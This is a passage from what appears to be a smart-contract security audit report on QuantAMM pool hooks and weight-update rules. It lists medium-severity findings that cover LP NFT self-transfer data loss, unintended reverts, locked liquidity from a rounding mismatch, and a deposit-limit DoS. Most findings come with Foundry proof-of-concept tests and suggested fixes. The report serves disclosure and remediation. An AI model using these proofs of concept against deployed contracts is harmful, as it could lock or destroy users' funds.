            //if transfering the record in the vault needs to be changed to reflect the change in ownership
            router.afterUpdate(previousOwner, to, tokenId);
        }
    }
```

In `afterUpdate` function, it will reorder the entire array by the following code:

```Solidity
                if (tokenIdIndex != feeDataArrayLength - 1) {
                    //Reordering the entire array could be expensive but it is the only way to keep true FILO
                    for (uint i = tokenIdIndex + 1; i < feeDataArrayLength; i++) {
                        delete feeDataArray[i - 1];
                        feeDataArray[i - 1] = feeDataArray[i];
                    }
                }

                delete feeDataArray[feeDataArrayLength - 1];
                feeDataArray.pop();
```

However, this function does not handle the scenario where `_from == _to`. If `_from` and `_to` are the same address, the function will attempt to:

1. Update the `FeeData` entry for the `_tokenID`.
2. Push the updated `FeeData` entry into the `poolsFeeData` array for the same address (`_to == _from`).
3. Reorder the `FeeData` array for `_from` by shifting elements and deleting the last entry.

This could result in **duplicate entries** or **incorrect state updates** in the `poolsFeeData` array, as the same `FeeData` entry is being pushed into the array while the original entry is still being processed.

Consider Bob has the folliwng LP NFT:

```Solidity
[
    { tokenID: 123, lpTokenDepositValue: 100, blockTimestampDeposit: 1000, upliftFeeBps: 10 },
    { tokenID: 456, lpTokenDepositValue: 200, blockTimestampDeposit: 2000, upliftFeeBps: 20 }
]
```

He transfers `tokenID=123` NFT to himself, this NFT will be pushed into the `poolsFeeData` array:

```Solidity
[
    { tokenID: 123, lpTokenDepositValue: 100, blockTimestampDeposit: 1000, upliftFeeBps: 10 },
    { tokenID: 456, lpTokenDepositValue: 200, blockTimestampDeposit: 2000, upliftFeeBps: 20 },
    { tokenID: 123, lpTokenDepositValue: 100, blockTimestampDeposit: 1000, upliftFeeBps: 10 }
]
```

And then the function will reorder the `poolsFeeData` array by shifting elements. After reordering, the array becomes:

```Solidity
[
    { tokenID: 456, lpTokenDepositValue: 200, blockTimestampDeposit: 2000, upliftFeeBps: 20 }
    { tokenID: 456, lpTokenDepositValue: 200, blockTimestampDeposit: 2000, upliftFeeBps: 20 },
    { tokenID: 123, lpTokenDepositValue: 100, blockTimestampDeposit: 1000, upliftFeeBps: 10 }
]
```

And then the function will execute the following code:

```Solidity
delete feeDataArray[feeDataArrayLength - 1];
feeDataArray.pop();
```

To note that the `feeDataArrayLength` is queried before the push action:

```Solidity
 FeeData[] storage feeDataArray = poolsFeeData[poolAddress][_from];

uint256 feeDataArrayLength = feeDataArray.length;
...
...
//actual transfer not a afterTokenTransfer caused by a burn
poolsFeeData[poolAddress][_to].push(feeDataArray[tokenIdIndex]);
```

So the `feeDataArrayLength` is 2 instead of 3, so the actual delete logic is :

```Solidity
delete feeDataArray[2 - 1];
feeDataArray.pop();
```

the `poolsFeeData` array becomes:

```Solidity
[
    { tokenID: 456, lpTokenDepositValue: 200, blockTimestampDeposit: 2000, upliftFeeBps: 20 }
    { tokenID: 0, lpTokenDepositValue: 0, blockTimestampDeposit: 0, upliftFeeBps: 0 },
]
```

We can see that the NFT( `tokenID=123` ) has been deleted.

###### POC

You can add following test to `UpliftExample.t`.sol :

```solidity
//@audit user will lost his liquidity if he transfer the LP NFT to himself
    function testSelfTransferDeposits() public {
        uint256[] memory maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)].toMemoryArray();
        vm.startPrank(bob);
        uint256 bptAmountDeposit = bptAmount / 150;
        uint256[] memory tokenIndexArray = new uint256[]();
        for (uint256 i = 0; i < 2; i++) {
            tokenIndexArray[i] = i + 1;
            upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, bptAmountDeposit, false, bytes(""));
            skip(1 days);
        }
        UpliftOnlyExample.FeeData[] memory bobFees = upliftOnlyRouter.getUserPoolFeeData(pool, bob);
        assertNotEq(bobFees[0].tokenID, 0, "first tokenId should not be 0");
        assertNotEq(bobFees[1].tokenID, 0, "second tokenId should not be 0");
        vm.stopPrank();

        LPNFT lpNft = upliftOnlyRouter.lpNFT();

        vm.startPrank(bob);

        lpNft.transferFrom(bob, bob, 1);

        bobFees = upliftOnlyRouter.getUserPoolFeeData(pool, bob);
        assertNotEq(bobFees[0].tokenID, 0, "first tokenId should not be 0");
        assertNotEq(bobFees[1].tokenID, 0, "second tokenId should not be 0");
        vm.stopPrank();
    }

```

run `forge test --match-test testSelfTransferDeposits` :

```Solidity
Ran 1 test for test/foundry/UpliftExample.t.sol:UpliftOnlyExampleTest
[FAIL: second tokenId should not be 0: 0 == 0] testSelfTransferDeposits() (gas: 958680)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 16.24ms (893.13µs CPU time)
```

We can see that the second LP will be deleted.&#x20;

In summary, because the `afterUpdate` function does not check if `_from` is equal to `_to`, it unintentionally performs updates and reaches a reordering logic that is irrelevant when no ownership change occurs. This can result in critical loss of liquidity NFT.

## Impact

The impact is HIGH because it will cause funds loss and the likelihood is MEDIUM, so the severity is HIGH.

## Tools Used

Manual Review

## Recommendations

Consider following fix:

```Solidity
 function afterUpdate(address _from, address _to, uint256 _tokenID) public {
        if (msg.sender != address(lpNFT)) {
            revert TransferUpdateNonNft(_from, _to, msg.sender, _tokenID);
        }
        if (_from == _to){return;}
        ...
        ...
```

## <a id='M-05'></a>M-05. formula Deviation from White Paper and Weighted Pool `performUpdate` unintended revert

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The White Paper states that there should be no difference in the calculation of scaler and vector values across formulas. Additionally, during the unguarded weights stage, the protocol should allow negative weights, as the guard weight ensures final weights validity.

However, for vector kappa values, the `performUpdate` function reverts when it theoretically should not. While a valid revert for a single `performUpdate` is expected behavior, this particular revert should not be treated as default/valid behavior.

## Vulnerability Details

The White Paper mentions that a strategy can utilize either scalar or vector kappa values. The primary difference lies in implementation complexity, as vector kappa values require an additional `SLOAD` operation and a nested loop for processing.
![White Paper reference](https://i.ibb.co/fQdFf2s/image.png)
The same formula is applied for both scaler and vector kappa values, ensuring uniformity in calculations regardless of the type of kappa value used.
![Formula](https://i.ibb.co/JFVpysX/image1.png\[/img]\[/url])
The current strategy algorithm supports both short and long positions. However, the additional check in the implementation, as shown in the code below, prevents the weighted pool from functioning with long/short positions if the unguarded weights return negative values after a price change.

```solidity
contracts/rules/AntimomentumUpdateRule.sol:100
100:         newWeightsConverted = new int256[](_prevWeights.length);
101:         if (locals.kappa.length == 1) {
102:             locals.normalizationFactor /= int256(_prevWeights.length);
103:             // w(t − 1) + κ ·(ℓp(t) − 1/p(t) · ∂p(t)/∂t)
104: 
105:             for (locals.i = 0; locals.i < _prevWeights.length; ) {
106:                 int256 res = int256(_prevWeights[locals.i]) +
107:                     int256(locals.kappa[0]).mul(locals.normalizationFactor - locals.newWeights[locals.i]); 
108:                 newWeightsConverted[locals.i] = res; 
110:                 unchecked {
111:                     ++locals.i;
112:                 }
113:             }
114:         } else {
115:             for (locals.i = 0; locals.i < locals.kappa.length; ) {
116:                 locals.sumKappa += locals.kappa[locals.i];
117:                 unchecked {
118:                     ++locals.i;
119:                 }
120:             }
121: 
122:             locals.normalizationFactor = locals.normalizationFactor.div(locals.sumKappa);
123:             
124:             for (locals.i = 0; locals.i < _prevWeights.length; ) {
125:                 // w(t − 1) + κ ·(ℓp(t) − 1/p(t) · ∂p(t)/∂t)
126:                 int256 res = int256(_prevWeights[locals.i]) +
127:                     int256(locals.kappa[locals.i]).mul(locals.normalizationFactor - locals.newWeights[locals.i]);
128:                 require(res >= 0, "Invalid weight"); // @audit : no valid revert
129:                 newWeightsConverted[locals.i] = res;
130:                 unchecked {
131:                     ++locals.i;
132:                 }
133:             }
134:         }
135: 
136:         return newWeightsConverted;
```

The following POC demonstrates how the algorithm behaves differently when using scaler versus vector kappa values.

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.8.24;

import "forge-std/Test.sol";

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { IVault } from "@balancer-labs/v3-interfaces/contracts/vault/IVault.sol";
import { IVaultErrors } from "@balancer-labs/v3-interfaces/contracts/vault/IVaultErrors.sol";
import { PoolRoleAccounts } from "@balancer-labs/v3-interfaces/contracts/vault/VaultTypes.sol";

import { CastingHelpers } from "@balancer-labs/v3-solidity-utils/contracts/helpers/CastingHelpers.sol";
import { ArrayHelpers } from "@balancer-labs/v3-solidity-utils/contracts/test/ArrayHelpers.sol";
import { BalancerPoolToken } from "@balancer-labs/v3-vault/contracts/BalancerPoolToken.sol";
import { BaseVaultTest } from "@balancer-labs/v3-vault/test/foundry/utils/BaseVaultTest.sol";

import { QuantAMMWeightedPool } from "../../contracts/QuantAMMWeightedPool.sol";
import { QuantAMMWeightedPoolFactory } from "../../contracts/QuantAMMWeightedPoolFactory.sol";
import { QuantAMMWeightedPoolContractsDeployer } from "./utils/QuantAMMWeightedPoolContractsDeployer.sol";
import { PoolSwapParams, SwapKind } from "@balancer-labs/v3-interfaces/contracts/vault/VaultTypes.sol";
import { OracleWrapper } from "@balancer-labs/v3-interfaces/contracts/pool-quantamm/OracleWrapper.sol";
import { MockUpdateWeightRunner } from "../../contracts/mock/MockUpdateWeightRunner.sol";
import { MockMomentumRule } from "../../contracts/mock/mockRules/MockMomentumRule.sol";
import { MockAntiMomentumRule } from "../../contracts/mock/mockRules/MockAntiMomentumRule.sol";
import { MockChainlinkOracle } from "../../contracts/mock/MockChainlinkOracles.sol";

import "@balancer-labs/v3-interfaces/contracts/pool-quantamm/IQuantAMMWeightedPool.sol";

contract QuantAMMWeightedPoolRevertCase is QuantAMMWeightedPoolContractsDeployer, BaseVaultTest {
    using CastingHelpers for address[];
    using ArrayHelpers for *;

    uint256 internal daiIdx;
    uint256 internal usdcIdx;

    // Maximum swap fee of 10%
    uint64 public constant MAX_SWAP_FEE_PERCENTAGE = 10e16;

    QuantAMMWeightedPoolFactory internal quantAMMWeightedPoolFactory;

    function setUp() public override {
        uint delay = 3600;

        super.setUp();
        (address ownerLocal, address addr1Local, address addr2Local) = (vm.addr(1), vm.addr(2), vm.addr(3));
        owner = ownerLocal;
        addr1 = addr1Local;
        addr2 = addr2Local;
        // Deploy UpdateWeightRunner contract
        vm.startPrank(owner);
        updateWeightRunner = new MockUpdateWeightRunner(owner, addr2, false);

        chainlinkOracle = _deployOracle(1e18, delay);
        chainlinkOracle2 = _deployOracle(1e18, delay); // initial Price

        updateWeightRunner.addOracle(OracleWrapper(chainlinkOracle));
        updateWeightRunner.addOracle(OracleWrapper(chainlinkOracle2));

        vm.stopPrank();

        quantAMMWeightedPoolFactory = deployQuantAMMWeightedPoolFactory(
            IVault(address(vault)),
            365 days,
            "Factory v1",
            "Pool v1"
        );
        vm.label(address(quantAMMWeightedPoolFactory), "quantamm weighted pool factory");

        (daiIdx, usdcIdx) = getSortedIndexes(address(dai), address(usdc));
    }
    function testQuantAMMWeightedPoolGetNormalizedWeightsInitial() public {
    //===================================Works Fine=============================================================//
        QuantAMMWeightedPoolFactory.NewPoolParams memory params = _createPoolParams(true,ZERO_BYTES32);
        params._initialWeights[0] = 0.80e18; // 80%
        params._initialWeights[1] = 0.20e18; // 20%

        (address quantAMMWeightedPool, ) = quantAMMWeightedPoolFactory.create(params);

        uint256[] memory weights = QuantAMMWeightedPool(quantAMMWeightedPool).getNormalizedWeights();

        vm.prank(owner);
        updateWeightRunner.setApprovedActionsForPool(quantAMMWeightedPool,1);
        
        updateWeightRunner.performUpdate(quantAMMWeightedPool);

        chainlinkOracle.updateData(0.9e18, uint40(block.timestamp));
        chainlinkOracle2.updateData(2.5e18, uint40(block.timestamp)); // price increase by 150% which is valid price change but it works fine
         
        // Move forward 10 blocks
        vm.warp(block.timestamp+1000);
        updateWeightRunner.performUpdate(quantAMMWeightedPool);

       uint256[] memory weightsData = QuantAMMWeightedPool(quantAMMWeightedPool).getNormalizedWeights();

        assertNotEq(weightsData[0],uint256(params._initialWeights[0]));
        assertNotEq(weightsData[1],uint256(params._initialWeights[1]));

// =========================================Unintended Revert========================================================

        params = _createPoolParams(false,bytes32("TheKhans"));
        params._initialWeights[0] = 0.80e18;
        params._initialWeights[1] = 0.20e18;
        ( quantAMMWeightedPool, ) = quantAMMWeightedPoolFactory.create(params);
        weights = QuantAMMWeightedPool(quantAMMWeightedPool).getNormalizedWeights();
        vm.prank(owner);
        updateWeightRunner.setApprovedActionsForPool(quantAMMWeightedPool,1);
        updateWeightRunner.performUpdate(quantAMMWeightedPool);
        chainlinkOracle.updateData(0.9e18, uint40(block.timestamp));
        chainlinkOracle2.updateData(2.5e18, uint40(block.timestamp));// price increase by 150% which is valid price change here it will revert.
        // Move forward 10 blocks
        vm.warp(block.timestamp+1000);
        vm.expectRevert();
        updateWeightRunner.performUpdate(quantAMMWeightedPool);

    }


    function _createPoolParams(bool useScalerKappa,bytes32 salt) internal returns (QuantAMMWeightedPoolFactory.NewPoolParams memory retParams) {
        PoolRoleAccounts memory roleAccounts;
        IERC20[] memory tokens = [address(dai), address(usdc)].toMemoryArray().asIERC20();
        MockAntiMomentumRule momentumRule = new MockAntiMomentumRule(address(updateWeightRunner));

        uint32[] memory weights = new uint32[]();
        weights[0] = uint32(uint256(0.5e18));
        weights[1] = uint32(uint256(0.5e18));

        int256[] memory initialWeights = new int256[]();
        initialWeights[0] = 0.5e18;
        initialWeights[1] = 0.5e18;
        uint256[] memory initialWeightsUint = new uint256[]();
        initialWeightsUint[0] = 0.5e18;
        initialWeightsUint[1] = 0.5e18;

        uint64[] memory lambdas = new uint64[]();
        lambdas[0] = 0.2e18;
        int256[][] memory parameters;
        if(!useScalerKappa){
            parameters = new int256[][]();
            parameters[0] = new int256[]();
            parameters[0][0] = 0.6e18;
            parameters[0][1] = 0.6e18;
        }else{
            parameters = new int256[][]();
            parameters[0] = new int256[]();
            parameters[0][0] = 0.6e18;
        }
        address[][] memory oracles = new address[][]();
        oracles[0] = new address[]();
        oracles[1] = new address[]();
        oracles[0][0] = address(chainlinkOracle);
        oracles[1][0] = address(chainlinkOracle2);

        retParams = QuantAMMWeightedPoolFactory.NewPoolParams(
            "Pool With Donation",
            "PwD",
            vault.buildTokenConfig(tokens),
            initialWeightsUint,
            roleAccounts,
            MAX_SWAP_FEE_PERCENTAGE,
            address(0),
            true,
            false, // Do not disable unbalanced add/remove liquidity
            salt, // salt
            initialWeights,
            IQuantAMMWeightedPool.PoolSettings(
                new IERC20[](2),
                IUpdateRule(momentumRule),
                oracles,
                60,
                lambdas,
                0.2e18,
                0.02e18, // absolute guard rail
                0.2e18,
                parameters,
                address(0)
            ),
            initialWeights,
            initialWeights,
            3600,
            0,
            new string[][]()
        );
    }
}

```

Run it with `forge test --mt testQuantAMMWeightedPoolGetNormalizedWeightsInitial -vvv`

## Impact

In the case of vector kappa, the weights are not updated and continue using the old values, which is incorrect given the latest price changes. However, with single kappa, the update proceeds as expected, reflecting the new prices.

## Tools Used

Manual Review, Unit Testing

## Recommendations

It is recommended to remove the check `require(res >= 0, "Invalid weight");` from all currently implemented strategies/algorithms. This change will ensure compatibility with scenarios where unguarded weights may temporarily result in negative values, allowing the system to proceed as intended.

## <a id='M-06'></a>M-06. Slight miscalculation in maxAmountsIn for Admin Fee Logic in UpliftOnlyExample::onAfterRemoveLiquidity Causes Lock of All Funds

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The function `onAfterRemoveLiquidity` is responsible for handling post-liquidity removal operations, including fee calculations and administering liquidity back to the pool or QuantAMMAdmin. However, there is a subtle miscalculation in the `maxAmountsIn` parameter in line [541](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L541) during admin fee processing, particularly when `localData.adminFeePercent` > 0

## Vulnerability Details

When the admin fee is calculated and accrued fees are intended to be added back to the liquidity pool, the value of `maxAmountsIn` becomes slightly less than the actual token amounts required. This leads to a mismatch during the `addLiquidity` operation in the `_vault`, which results in a reversion with the following error:

```solidity
AmountInAboveMax(token, amountInRaw, params.maxAmountsIn[i])
```

This issue prevents liquidity removal operations from completing successfully, effectively locking user funds in the pool.

The problem lies in the following block of code:

```solidity
        if (localData.adminFeePercent > 0) {
            _vault.addLiquidity(
                AddLiquidityParams({
                    pool: localData.pool,
                    to: IUpdateWeightRunner(_updateWeightRunner).getQuantAMMAdmin(),
                    maxAmountsIn: localData.accruedQuantAMMFees,
                    minBptAmountOut: localData.feeAmount.mulDown(localData.adminFeePercent) / 1e18,
                    kind: AddLiquidityKind.PROPORTIONAL,
                    userData: bytes("")
                })
            );
            emit ExitFeeCharged(
                userAddress,
                localData.pool,
                IERC20(localData.pool),
                localData.feeAmount.mulDown(localData.adminFeePercent) / 1e18
            );
        }
```

Here:

* `localData.accruedQuantAMMFees[i]` is calculated using:

```solidity
localData.accruedQuantAMMFees[i] = exitFee.mulDown(localData.adminFeePercent);
```

However, as vault calculation favours the vault over the user, the calculated `amountInRaw` in vault is slightly more than the `params.maxAmountsIn[i]`. Ref-[1](https://github.com/balancer/balancer-v3-monorepo/blob/93bacf3b5f219edff6214bcf58f8fe62ec3fde33/pkg/vault/contracts/Vault.sol#L712-L715)

* When the `_vault` validates the input via:

```solidity
if (amountInRaw > params.maxAmountsIn[i]) {
    revert AmountInAboveMax(token, amountInRaw, params.maxAmountsIn[i]);
}
```

The slight discrepancy causes a reversion, even when the difference is only by 1 wei.

## PoC

1. Create a new file named `UpLiftHookTest.t.sol` in `pkg/pool-hooks/test/foundry/`
2. Paste the following code:

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.24;

import { BaseVaultTest } from "@balancer-labs/v3-vault/test/foundry/utils/BaseVaultTest.sol";
import { QuantAMMWeightedPool, IQuantAMMWeightedPool } from "pool-quantamm/contracts/QuantAMMWeightedPool.sol";
import {QuantAMMWeightedPoolFactory} from "pool-quantamm/contracts/QuantAMMWeightedPoolFactory.sol";
import { UpdateWeightRunner, IUpdateRule } from "pool-quantamm/contracts/UpdateWeightRunner.sol";
import { MockChainlinkOracle } from "./utils/MockOracle.sol";
import "@balancer-labs/v3-interfaces/contracts/pool-quantamm/OracleWrapper.sol";
import { IUpdateRule } from "pool-quantamm/contracts/rules/UpdateRule.sol";
import { MockMomentumRule } from "pool-quantamm/contracts/mock/mockRules/MockMomentumRule.sol";
import { UpliftOnlyExample } from "../../contracts/hooks-quantamm/UpliftOnlyExample.sol";
import { IPermit2 } from "permit2/src/interfaces/IPermit2.sol";
import { IVault } from "@balancer-labs/v3-interfaces/contracts/vault/IVault.sol";
import { IVaultAdmin } from "@balancer-labs/v3-interfaces/contracts/vault/IVaultAdmin.sol";
import { PoolRoleAccounts, TokenConfig, HooksConfig } from "@balancer-labs/v3-interfaces/contracts/vault/VaultTypes.sol";
import { IWETH } from "@balancer-labs/v3-interfaces/contracts/solidity-utils/misc/IWETH.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { Router } from "@balancer-labs/v3-vault/contracts/Router.sol";
import {console} from "forge-std/console.sol";

contract UpLiftHookTest is BaseVaultTest {  // use default dai, usdc, weth and mock oracle
    //address daiOnETH = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    //address usdcOnETH = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    //address wethOnETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 internal daiIdx;
    uint256 internal usdcIdx;

    uint256 SWAP_FEE_PERCENTAGE = 10e16;

    address quantAdmin = makeAddr("quantAdmin");
    address owner = makeAddr("owner");
    address poolCreator = makeAddr("poolCreator");
    address liquidityProvider1 = makeAddr("liquidityProvider1");
    address liquidityProvider2 = makeAddr("liquidityProvider2");
    address attacker = makeAddr("attacker");
    //address usdcUsd = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    //address daiUsd = 0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9;
    //address ethOracle = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;

    QuantAMMWeightedPool public weightedPool;
    QuantAMMWeightedPoolFactory public weightedPoolFactory;
    UpdateWeightRunner public updateWeightRunner;
    MockChainlinkOracle mockOracledai;
    MockChainlinkOracle mockOracleusdc;
    MockChainlinkOracle ethOracle;
    Router externalRouter;

    UpliftOnlyExample upLifthook;

    function setUp() public override {
        vm.warp(block.timestamp + 3600);
        mockOracledai = new MockChainlinkOracle(1e18, 0);
        mockOracleusdc = new MockChainlinkOracle(1e18, 0);
        ethOracle = new MockChainlinkOracle(2000e18, 0);
        updateWeightRunner = new UpdateWeightRunner(quantAdmin, address(ethOracle));

        vm.startPrank(quantAdmin);
        updateWeightRunner.addOracle(OracleWrapper(address(mockOracledai)));
        updateWeightRunner.addOracle(OracleWrapper(address(mockOracleusdc)));
        vm.stopPrank();

        super.setUp();

        (daiIdx, usdcIdx) = getSortedIndexes(address(dai), address(usdc));

        vm.prank(quantAdmin);
        updateWeightRunner.setApprovedActionsForPool(pool, 2);
    }

    function createHook() internal override returns (address) {
        // Create the factory here, because it needs to be deployed after the Vault, but before the hook contract.
        weightedPoolFactory = new QuantAMMWeightedPoolFactory(IVault(address(vault)), 365 days, "Factory v1", "Pool v1", address(updateWeightRunner));
        // lp will be the owner of the hook. Only LP is able to set hook fee percentages.
        vm.prank(quantAdmin);
        upLifthook = new UpliftOnlyExample(IVault(address(vault)), IWETH(weth), IPermit2(permit2), 100, 100, address(updateWeightRunner), "version 1", "lpnft", "LP-NFT");
        return address(upLifthook);
    }

    function _createPool(
        address[] memory tokens,
        string memory label
    ) internal override returns (address newPool, bytes memory poolArgs) {
        QuantAMMWeightedPoolFactory.NewPoolParams memory poolParams = _createPoolParams(tokens);

        (newPool, poolArgs) = weightedPoolFactory.create(poolParams);
        vm.label(newPool, label);

        authorizer.grantRole(vault.getActionId(IVaultAdmin.setStaticSwapFeePercentage.selector), quantAdmin);
        vm.prank(quantAdmin);
        vault.setStaticSwapFeePercentage(newPool, SWAP_FEE_PERCENTAGE);
    }

    function _createPoolParams(address[] memory tokens) internal returns (QuantAMMWeightedPoolFactory.NewPoolParams memory retParams) {
        PoolRoleAccounts memory roleAccounts;

        uint64[] memory lambdas = new uint64[]();
        lambdas[0] = 0.2e18;
        
        int256[][] memory parameters = new int256[][]();
        parameters[0] = new int256[]();
        parameters[0][0] = 0.2e18;

        address[][] memory oracles = new address[][]();
        oracles[0] = new address[]();
        oracles[0][0] = address(mockOracledai);
        oracles[1] = new address[]();
        oracles[1][0] = address(mockOracleusdc);

        uint256[] memory normalizedWeights = new uint256[]();
        normalizedWeights[0] = uint256(0.5e18);
        normalizedWeights[1] = uint256(0.5e18);

        IERC20[] memory ierctokens = new IERC20[]();
        for (uint256 i = 0; i < tokens.length; i++) {
            ierctokens[i] = IERC20(tokens[i]);
        }

        int256[] memory initialWeights = new int256[]();
        initialWeights[0] = 0.5e18;
        initialWeights[1] = 0.5e18;
        
        int256[] memory initialMovingAverages = new int256[]();
        initialMovingAverages[0] = 0.5e18;
        initialMovingAverages[1] = 0.5e18;
        
        int256[] memory initialIntermediateValues = new int256[]();
        initialIntermediateValues[0] = 0.5e18;
        initialIntermediateValues[1] = 0.5e18;
        
        TokenConfig[] memory tokenConfig = vault.buildTokenConfig(ierctokens);
        
        retParams = QuantAMMWeightedPoolFactory.NewPoolParams(
            "Pool With Donation",
            "PwD",
            tokenConfig,
            normalizedWeights,
            roleAccounts,
            0.02e18,
            address(poolHooksContract),
            true,
            true, // Do not disable unbalanced add/remove liquidity
            0x0000000000000000000000000000000000000000000000000000000000000000,
            initialWeights,
            IQuantAMMWeightedPool.PoolSettings(
                ierctokens,
                IUpdateRule(new MockMomentumRule(owner)),
                oracles,
                60,
                lambdas,
                0.2e18,
                0.2e18,
                0.3e18,
                parameters,
                poolCreator
            ),
            initialMovingAverages,
            initialIntermediateValues,
            3600,
            16,//able to set weights
            new string[][]()
        );
    }

    function testRemoveLiquidityUplift() public {
        addLiquidity();
        
        uint256[] memory minAmountsOut = new uint256[]();
        minAmountsOut[0] = 1;
        minAmountsOut[1] = 1;

        vm.prank(liquidityProvider1);
        UpliftOnlyExample(payable(poolHooksContract)).removeLiquidityProportional(2e18, minAmountsOut, true, pool);
    }

    function addLiquidity() public {
        deal(address(dai), liquidityProvider1, 100e18);
        deal(address(usdc), liquidityProvider1, 100e18);

        uint256[] memory maxAmountsIn = new uint256[]();
        maxAmountsIn[0] = 2.1e18;
        maxAmountsIn[1] = 2.1e18;
        uint256 exactBptAmountOut = 2e18;

        vm.startPrank(liquidityProvider1);
        IERC20(address(dai)).approve(address(permit2), 100e18);
        IERC20(address(usdc)).approve(address(permit2), 100e18);
        permit2.approve(address(dai), address(poolHooksContract), 100e18, uint48(block.timestamp));
        permit2.approve(address(usdc), address(poolHooksContract), 100e18, uint48(block.timestamp));
        UpliftOnlyExample(payable(poolHooksContract)).addLiquidityProportional(pool, maxAmountsIn, exactBptAmountOut, false, abi.encodePacked(liquidityProvider1));
        vm.stopPrank();

        deal(address(dai), liquidityProvider2, 100e18);
        deal(address(usdc), liquidityProvider2, 100e18);

        vm.startPrank(liquidityProvider2);
        IERC20(address(dai)).approve(address(permit2), 100e18);
        IERC20(address(usdc)).approve(address(permit2), 100e18);
        permit2.approve(address(dai), address(poolHooksContract), 100e18, uint48(block.timestamp));
        permit2.approve(address(usdc), address(poolHooksContract), 100e18, uint48(block.timestamp));
        UpliftOnlyExample(payable(poolHooksContract)).addLiquidityProportional(pool, maxAmountsIn, exactBptAmountOut, false, abi.encodePacked(liquidityProvider2));
        vm.stopPrank();

        console.log("Liquidity added");
    }
}
```

1. Go the the `pool-hooks` folder using terminal and run `forge test --mt testRemoveLiquidityUplift -vv`
   The test will revert with error:

```solidity
AmountInAboveMax()
```

## Impact

All liquidity removal operations revert, effectively locking user funds in the pool.

## Tools Used

Foundry

## Recommendations

* Add a small buffer to `localData.accruedQuantAMMFees` to account for precision errors. For example:

```solidity
for(uint256 i=0; i<localData.accruedQuantAMMFees.length; i++) {
    localData.accruedQuantAMMFees[i] += 1;
    hookAdjustedAmountsOutRaw[i] -= 1;
}
```

* Or reduce the `minBptAmountOut` silghtly:

```diff
        if (localData.adminFeePercent > 0) {
            _vault.addLiquidity(
                AddLiquidityParams({
                    pool: localData.pool,
                    to: IUpdateWeightRunner(_updateWeightRunner).getQuantAMMAdmin(),
                    maxAmountsIn: localData.accruedQuantAMMFees,
-                   minBptAmountOut: localData.feeAmount.mulDown(localData.adminFeePercent) / 1e18,
+                   minBptAmountOut: localData.feeAmount.mulDown(localData.adminFeePercent) / 1e18 -1,
                    kind: AddLiquidityKind.PROPORTIONAL,
                    userData: bytes("")
                })
            );
            emit ExitFeeCharged(
                userAddress,
                localData.pool,
                IERC20(localData.pool),
                localData.feeAmount.mulDown(localData.adminFeePercent) / 1e18
            );
        }
```

## <a id='M-07'></a>M-07. Transferring deposit NFT doesn't check if the receiver exceeds the 100 deposit limit

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Transferring doesn't check if the receiver already has 100 deposits and allows exceeding it without limit.

## Vulnerability Details

When transferring deposit NFT the functionality doesn't check if the receiver already has reached the limit. Thus allowing for a user address to potentially have unlimited amount of deposits.

## Impact

When deposits are unlimited it can create a partial-DOS. If a user has many small amount deposits sent to him he will not be able to withdraw all amounts before removing smaller ones due to gas limits. And also may experience DOS while sending away  deposits due to iteration running out of gas while trying to find the tokenID:

```Solidity
for (uint256 i; i < feeDataArrayLength; ++i) {
    if (feeDataArray[i].tokenID == _tokenID) {
        tokenIdIndex = i;
        tokenIdIndexFound = true;
        break;
    }
}
```

\
\
Because there are no condition requirements this can be abused by malicious actors using dust amount deposit transfers and DOS'ing users (especially on cheaper gas chains - Arbitrum, Base), but since nothing really is gained apart from disruption - Low/Medium.

## Tools Used

Manual review + foundry test

```Solidity
    function testNftTransferAllowsExceedingDepositLimit() public {
        // Add liquidity so bob has BPT to remove liquidity.
        uint256[] memory maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)].toMemoryArray();
        uint256 input = 100;

        vm.prank(alice);
        upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, input, false, bytes(""));

        // Current limitation is max limitation is inaccurate and allows up to 101 deposits
        for (uint256 i = 0; i < 101; ++i) {
            vm.prank(bob);
            upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, input, false, bytes(""));
        }

        LPNFT nft = LPNFT(upliftOnlyRouter.lpNFT());
        vm.prank(alice);
        nft.transferFrom(address(alice), address(bob), 1);

        // exceeds the 101 limit imposed by the router
        assertEq(upliftOnlyRouter.getUserPoolFeeData(pool, bob).length, 102);
    }
```

## Recommendations

Add this check

```Solidity
if (poolsFeeData[poolAddress][_to].length >= 100) {
    revert TooManyDeposits(poolAddress, _to);
}
```

to router `function afterUpdate(address _from, address _to, uint256 _tokenID) public`

## <a id='M-08'></a>M-08. The `computeBalance` function may revert because the `setWeights` function doesn't check the boundary of the normalized weight 

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

As per the `WeightedMath` , the normalized weight has a boundary which is between 0.01 and 0.99. If the normalized weight set by the `setWeights` function breaks this boundary, the `computeBalance` will revert due to math overflow.

## Vulnerability Details

The comments in `WeightedMath` imply that the boundary of the normalized weights is between 0.01 and 0.99:

```Solidity
    // In computing `balance^normalizedWeight`, `log(balance) * normalizedWeight` must fall within the `pow` function
    // bounds described above. Since 0.01 <= normalizedWeight <= 0.99, the balance is constrained to the range between
    // e^(ExpMin) and e^(ExpMax).
```

